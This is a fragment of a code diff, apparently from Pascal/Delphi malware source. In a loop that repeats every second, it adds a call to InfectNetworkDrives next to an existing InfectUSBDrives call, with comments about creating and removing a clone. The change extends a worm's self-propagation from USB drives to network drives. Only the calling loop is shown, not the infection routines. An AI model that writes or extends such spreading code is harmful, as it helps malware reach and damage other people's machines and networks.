@@ -405,6 +405,7 @@ Begin
       //Create clone
       While Not(Terminated) do Begin
         InfectUSBDrives;
+        InfectNetworkDrives;
         Sleep(1000);
       end;
       //Remove clone
